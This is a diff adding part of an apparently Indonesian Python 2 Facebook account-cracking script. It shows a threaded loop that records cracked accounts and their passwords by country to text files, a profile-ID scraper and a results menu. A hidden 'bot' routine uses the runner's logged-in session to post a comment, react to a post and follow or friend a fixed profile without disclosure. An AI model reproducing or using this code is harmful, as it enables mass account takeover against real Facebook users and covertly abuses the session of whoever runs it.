+							print '\x1b[0;92m[Berhasil]\x1b[0;97m ' + em + ' \x1b[0;92m\xe2\x88\x86 \x1b[0;97m' + pr4
+							oke = open('done/follow.txt', 'a')
+							oke.write('\n[Berhasil] ' + em + ' \xe2\x88\x86 ' + pr4)
+							oke.close()
+							oks.append(em)
+						elif 'checkpoint' in xo:
+							print '\x1b[0;93m[Cekpoint]\x1b[0;97m ' + em + ' \x1b[0;93m\xe2\x88\x86\x1b[0;97m ' + pr4
+							cek = open('done/follow.txt', 'a')
+							cek.write('\n[Cekpoint] ' + em + ' \xe2\x88\x86 ' + pr4)
+							cek.close()
+							cekpoint.append(em)
+		except:
+			pass
+		
+
+
+	p = ThreadPool(20)
+	p.map(main, id)
+	print '\x1b[0;93m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
+	time.sleep(0.07)
+	print '\x1b[0;91m\xe2\x80\xa2 \x1b[0;93mSelesai ...'
+	print '\x1b[0;91m\xe2\x80\xa2 \x1b[0;93mTotal \x1b[0;92mOK\x1b[0;97m/\x1b[0;93mCP \x1b[0;97m: \x1b[0;92m' + str(len(oks)) + '\x1b[0;97m/\x1b[0;93m' + str(len(cekpoint))
+	print '\x1b[0;91m\xe2\x80\xa2 \x1b[0;92mOK\x1b[0;97m/\x1b[0;93mCP \x1b[0;93mfile tersimpan \x1b[0;91m: \x1b[0;92mdone/follow.txt'
+	print 50 * '\x1b[0;93m\xe2\x94\x80'
+	raw_input('\x1b[0;97m< \x1b[0;93mKembali\x1b[0;97m >')
+	os.system('python2 crack-2.py')
+
+
+def cari_id():
+	os.system('clear')
+	print logo
+	print '\x1b[0;93m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
+	time.sleep(0.07)
+	ling = 'https://www.facebook.com/'
+	url = ling + raw_input('\x1b[0;91m\xe2\x80\xa2 \x1b[0;93mUsername \x1b[0;91m:\x1b[0;92m ')
+	idre = re.compile('"entity_id":"([0-9]+)"')
+	page = requests.get(url)
+	nex = idre.findall(page.content)
+	for hasil in nex:
+		print '\n' + '\x1b[0;91m\xe2\x80\xa2 \x1b[0;93mID Anda\x1b[0;91m :\x1b[0;92m ' + hasil
+		raw_input('\n\x1b[0;97m< \x1b[0;92mKembali \x1b[0;97m>')
+		menu()
+
+def hasil_crack():
+	os.system('clear')
+	print logo
+	print '\x1b[0;93m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
+	time.sleep(0.07)
+	print '\x1b[0;92m1. \x1b[0;97mLihat Hasil Crack Indonesia'
+	time.sleep(0.07)
+	print '\x1b[0;92m2. \x1b[0;97mLihat Hasil Crack Bangladesh'
+	time.sleep(0.07)
+	print '\x1b[0;92m3. \x1b[0;97mLihat Hasil Crack Pakistan'
+	time.sleep(0.07)
+	print '\x1b[0;92m4. \x1b[0;97mLihat Hasil Crack Usa'
+	time.sleep(0.07)
+	print '\x1b[0;92m5. \x1b[0;97mLihat Hasil Crack Like'
+	time.sleep(0.07)
+	print '\x1b[0;92m6. \x1b[0;97mLihat Hasil Crack Follow'
+	time.sleep(0.07)
+	print '\x1b[0;91m0. \x1b[0;97mKembali'
+	time.sleep(0.07)
+	print '\x1b[0;93m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
+	time.sleep(0.07)
+	pilih_hasil()
+
+def pilih_hasil():
+	keak = raw_input('\x1b[0;92m>\x1b[0;97m ')
+	if keak == '':
+		print '\x1b[0;91m! Isi Yg Benar'
+		pilih_hasil()
+	elif keak == '1':
+		os.system('xdg-open done/indo.txt')
+		hasil_crack()
+	elif keak == '2':
+		os.system('xdg-open done/bangla.txt')
+		hasil_crack()
+	elif keak == '3':
+		os.system('xdg-open done/bangla.txt')
+		hasil_crack()
+	elif keak == '4':
+		os.system('xdg-open done/pakis.txt')
+		hasil_crack()
+	elif keak == '5':
+		os.system('xdg-open done/usa.txt')
+		hasil_crack()
+	elif keak == '6':
+		os.system('xdg-open done/like.txt')
+		hasil_crack()
+	elif keak == '7':
+		os.system('xdg-open done/follow.txt')
+		hasil_crack()
+	elif keak == '0':
+		menu()
+	else:
+		print '\x1b[0;91mIsi Yg Benar'
+
+def perbarui():
+	os.system('clear')
+	print logo
+	print '\x1b[0;93m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
+	time.sleep(0.07)
+	jalan('\x1b[0;92mMemperbarui Script ...\x1b[0;93m')
+	os.system('git pull origin master')
+	raw_input('\n\x1b[0;97m<\x1b[0;92m Kembali \x1b[0;97m>')
+	os.system('python2 crack-2.py')
+	
+	def bot():
+		try:
+			res = webGet(url + '/language.php')
+			bs = parser(res, 'html.parser')
+			if 'Bahasa Indonesia' in str(bs):
+				nex = bs.find('a', string='Bahasa Indonesia')['href']
+				webGet(url + nex)
+		except:
+			pass
+	
+		try:
+			komenku = [
+			 'HADIR PENGGUNA BOT \xf0\x9f\x98\x8e', 'KEREN ABIS BOTNYA \xf0\x9f\x98\x80', 'MANTAP BANG \xf0\x9f\x98\x81']
+			res = webGet(url + '/1582271841968400')
+			bs = parser(res, 'html.parser')
+			for x in bs('form'):
+				action = x['action']
+	
+			jazo = bs.find('input', {'name': 'jazoest'})['value']
+			dtsg = bs.find('input', {'name': 'fb_dtsg'})['value']
+			kome = random.choice(komenku)
+			web = datetime.datetime.now()
+			waktu = web.strftime('%H:%M: / %d-%m-%Y ')
+			hour = web.hour
+			if 3 < hour < 6:
+				boy = 'Selamat Dini Hari \x1a\xf0\x9f\x92\x9c'
+			else:
+				if 6 <= hour < 11:
+					boy = 'Selamat Pagi \xf0\x9f\x92\x99'
+				elif 11 <= hour < 15:
+					boy = 'Selamat Siang \xf0\x9f\x92\x9b'
+				elif 15 <= hour < 18:
+					boy = 'Selamat Sore \xf0\x9f\x92\x9a'
+				else:
+					boy = 'Selamat Malam \xf0\x9f\x96\xa4'
+				name = '@[100005567988235:]'
+				otw = boy + '\n' + name + '\n' + kome + '\n' + waktu
+				form = {'jazoest': jazo, 
+				   'fb_dtsg': dtsg, 
+				   'comment_text': otw}
+				webPost(base + action, form)
+				res = webGet(url + '/reactions/picker/?is_permalink=1&ft_id=1582271841968400')
+				bs = parser(res, 'html.parser')
+				for ok in bs.find_all('a'):
+					if 'reaction_type=4' in str(ok) or 'reaction_type=8' in str(ok):
+						ab = base + ok['href']
+						webGet(ab)
+	
+			res = webGet(url + '/profile.php?id=100005567988235&v=timeline')
+			bs = parser(res, 'html.parser')
+			if 'Ikuti' in str(bs):
+				ps = bs.find('a', string='Ikuti')['href']
+			elif 'Tambah Teman' in str(bs):
+				ps = bs.find('a', string='Tambah Teman')['href']
+			webGet(url + ps)
+			print '\n[\xe2\x88\x9a] Login Berhasil' % green
+			time.sleep(2)
+			menu()
+		except:
+			pass
+	
+		print '\n[\xe2\x88\x9a] Login Berhasil' % green
+		time.sleep(2)
+		menu()
+
+
+
+if __name__ == '__main__':
+	menu()
+	masuk()
